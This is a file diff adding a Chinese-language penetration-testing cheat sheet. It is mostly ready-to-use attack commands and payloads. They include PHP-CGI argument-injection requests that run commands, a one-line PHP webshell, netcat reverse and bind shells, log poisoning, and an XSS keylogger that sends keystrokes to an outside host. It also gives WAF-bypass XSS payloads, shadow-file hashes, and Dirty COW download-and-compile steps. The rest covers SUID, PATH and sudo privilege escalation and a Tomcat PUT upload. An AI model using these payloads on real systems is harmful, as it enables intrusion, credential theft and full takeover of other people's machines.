@@ -1,0 +1,187 @@
+﻿#默认安装----------------------------------------------------------------------
+
+Windows默认安装漏洞
+#PHP默认安装
+#phpMyAdmin/setUp：如果可以访问，则可以管理后台数据库。
+
+#发送如下内容获取shell返回结果：
+
+POST http://10.10.10.137/phpMyAdmin/?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input HTTP/1.1
+Host:10.10.10.137
+Content-Length: 34
+
+<?php
+
+passthru('pwd');
+die();
+?>
+
+_______________________________________________________________________________
+_______________________________________
+#写入webshell:发送如下命令(将木马写入/var/www/3.php文件中)
+
+echo "<?php \$cmd= \$_GET["cmd"];system(\$cmd);?>" > /var/www/3.php
+#PHP反弹shell
+
+1.kali提供反弹shell脚本：/usr/share/webshells/php/php-reverse-shell.php。
+
+修改文件中的$ip为本地IP。$port（帧听端口随意）。
+
+帧听本地1234端口命令：nc -nvlp 1234。
+最后将文件内容全部复制，以上面的post方式发送到目标服务器。
+
+2.发送如下命令（让服务器侦听端口）:
+mkfifo /tmp/pipe;sh /tmp/pipe | nc -nlp 1234 > /tmp/pipe 或 nc -lp 1234 -e /bin/bash
+#Ubuntu/Debian默认安装PHP5-cgi>可直接访问/cgi-bin/php5和/cgi-bin/php（爬不出来的目录）。
+
+POST  /cgi-bin/php?%2D%64+%61%6C%6C%6F%77%5F%75%72%6C%5F%69%6E%63%6C%75%64%65%3D%6F%6E+%2D%64+%73%61%66%65%5F%6D%6F%64%65%3D%6F%66%66+%2D%64+%73%75%68%6F%73%69%6E%2E%73%69%6D%75%6C%61%74%69%6F%6E%3D%6F%6E+%2D%64+%64%69%73%61%62%6C%65%5F%66%75%6E%63%74%69%6F%6E%73%3D%22%22+%2D%64+%6F%70%65%6E%5F%62%61%73%65%64%69%72%3D%6E%6F%6E%65+%2D%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E%70%75%74+%2D%64+%63%67%69%2E%66%6F%72%63%65%5F%72%65%64%69%72%65%63%74%3D%30+%2D%64+%63%67%69%2E%72%65%64%69%72%65%63%74%5F%73%74%61%74%75%73%5F%65%6E%76%3D%30+%2D%6E HTTP/1.1
+Host:123
+<?php 
+echo system('pwd');
+die();
+?>
+#修改/etc/php5/cgi/php.ini文件中的allow_url_include = on
+可使WEB目录以外的文件读写、执行代码。
+#如果获取访问利用WEB应用的log文件权限，向log文件插入代码，然后请求log文件执行代码。
+例如：<?php echo shell_exec($_GET['cmd']);?>
+#kali漏洞利用向量字典：/usr/share/wfuzz/wordlist/general/
+#kali自带判断文件上传格式类型命令：mimetype euskera.txt
+_______________________________________________________________________________
+_______________________________________
+#XSS
+#XSS-keylogger键盘监听：
+document.onkeypress = function(evt){
+evt = evt || window.event
+key = String.fromCharCode(evt.charCode)
+if(key){
+var http = new XMLHttpRequest();
+var param = encodeURL(key)
+http.open("POST","http://1.1.1.1/keylogger.php",true);
+http.setRequestHeader("Content-type","application/x-www-form-urlencoded");
+http.send("key="+param);
+}
+}
+#绕waf写法：
+利用location.search：
+1.php?(1)&xss=" onerror=a=location;location="javascript:a"+"lert"+a[1]+a[2]+a[3] "
+利用注释和location.hash，把alert(233)放在#后面，再调用回来：
+1.php?xss=1" onerror=a=location;location="javascript:/*"+a.hash//#*/alert(233)
+eval执行，IE下报错弹框：
+1" onerror=javascript:window.onerror=eval;throw"=alert\x281\x29"
+利用this：
+1.php?xss=1" name=javasCript:alert%25281%2529 autofocus onfocus=location=this.name "
+this结合函数：<svg onload="a(this);function a()(alert(1))">
+_______________________________________________________________________________
+_______________________________________
+#提权
+查看/etc/shadow
+root:$1$TCVDVaiT$JC7TbKjvIZpIprdehWFH/1:15157:0:99999:7:::
+#/etc/shadow文件的每行由9个字段组成，以“：”作为字段分隔符。每个字段的说明：
+1. 用户名
+2. 加密后的密码。如果密码是“*”或“!”，则表示不会用这个帐号来登录（通常是一些后台进程）
+3. 密码最后修改时间。 从1970年1月1日起计算的天数。
+4. 不可修改密码的天数。 如果是0,则表示可以随时修改密码。如果是N，表示N天后才可修改密码。
+5. 密码可以维系的天数。如果设置为N，表示N天后必须更新密码。设置为99999通常表示无需更新密码。
+6. 在密码必须修改前的N天，就开始提示用户需要修改密码。
+7. 密码过期的宽限时间。
+8. 帐号失效时间。也是UNIX时间戳格式。
+9. 保留字段。
+#关闭shadow功能：pwunconv
+此时shadow文件消失，再次查看passwd文件：
+root:$6$0fa52kBa$5rQfmjjrmvVmepfQylZINajIUp/cTWi9GjdgONbYVRPlstFbjD54DXUgA2yE5QxdWm0ZX4.z238E/IPv0yAxY0:0:0:root:/root:/bin/bash
+#启动shadow功能：pwconv
+_______________________________________________________________________________
+_______________________________________
+#Linux利用漏洞提权
+早期版本漏洞：
+查看信息：searchsploit 18411.c
+kali里面记载利用漏洞文件位置：/usr/share/exploitdb/exploits/linux/local/18411.c
+执行编译命令：gcc 18411.c -o exp
+在目标系统执行exp即可获取root权限的shell
+#脏牛漏洞（CVE-2016 - 5195）Linux kernel>=2.6.22
+下载：https://github.com/gbonacini/CVE-2016-5195
+文件所在目录：https://github.com/gbonacini/CVE-2016-5195/blob/master/dcow.cpp
+直接下载：wget https://raw.githubusercontent.com/gbonacini/CVE-2016-5195/master/dcow.cpp
+编译文件：g++ -Wall -pedantic -O2 -pthread -o dcow dcow.cpp -lutil
+普通用户执行：./dcow -s 直接变成root
+kali编译cpp文件可能导致高版本编译在低版本操作系统运行报错。
+或者换个版本：
+相关wiki地址：https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
+可用文件：https://github.com/FireFart/dirtycow/blob/master/dirty.c
+编译：gcc -pthread dirty.c -o dirty -lcrypt
+普通用户执行./dirty 然后输入密码。（实际上用一个firefart用户替换root用户）
+#环境变量提权：
+代码：
+#include<unistd.h>
+void main(){
+setuid(0);
+setgid(0);
+system("su - test");
+}
+执行：echo "/bin/bash" > su
+执行：export PATH=/tmp/pdh:$PATH
+需要root权限：chmod u+s aaaa(编译后的二进制文件aaaa)
+*执行/bin/sh也同样可以
+
+#sudo提权
+查看sudoers文件：cat /etc/sudoers|grep -v ^#|grep -v ^$
+修改配置文件加一行：pdh ALL=(root) NOPASSWD: /usr/bin/awk,/usr/bin/less
+sudo -l 查看当前用户有哪些权限
+执行：sudo awk 'BEGIN {system("/bin/bash")}' 直接变root权限
+执行：sudo /usr/bin/less /etc/sysconfig/network-scripts/ifcfg-lo
+再输入：!/bin/bash 直接变root权限
+以上用/usr/bin/more也可以
+#或者添加：/usr/sbin/tcpdump到sudoers文件给pdh用户
+执行：echo $'id' > /tmp/.test
+执行：sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root
+#bash s权限位提权
+#bash
+root权限执行：chmod u+s /bin/bash
+普通权限执行：/bin/bash -p 提权成功
+#find
+find增加s权限位也是同样道理：chmod u+s /bin/find
+find /etc/passwd -exec "id" \; 执行""里面的命令。
+*如果是cp命令：find /tmp/passwd -exec cp '{}' /etc/passwd \;
+python代码：
+执行：python
+import os
+os.system("/bin/bash")
+___________________________________________________________________________
+_______________________________________
+#Linux重要文件信息收集
+/etc/resolv.conf
+/etc/passwd
+/etc/shadow
+whoami、who -a
+ifconfig -a
+iptables -L -n（防火墙配置信息）
+netstat -rn（查看路由）
+uname -a（版本信息内核）
+ps aux（列出进程）
+dpkg -l | head（列出软件包）
+___________________________________________________________________________
+_______________________________________
+#Tomcat
+默认后台管理页面：/manager/html
+后台管理员配置文件：tomcat-users.xml
+登录后台即可直接管理应用（报告上传war和启停服务）
+#默认情况下是禁止http请求中的上传（PUT）和删除（DELETE）方法的。在这里我们在conf/web.xml配置文件给他加入这样一行。开启他的PUT方法。
+<init-param>
+<param-name>readonly</param-name>
+<param-value>false</param-value>
+</init-param>
+这样就可以以PUT请求方式上传文件了：
+PUT /hello.jsp/ HTTP/1.1
+Host: 192.168.0.104:8080
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
+Accept: application/json, text/plain, */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Authorization: undefined
+Connection: close
+Pragma: no-cache
+Cache-Control: no-cache
+Content-Length: 5
+
+Hello World!
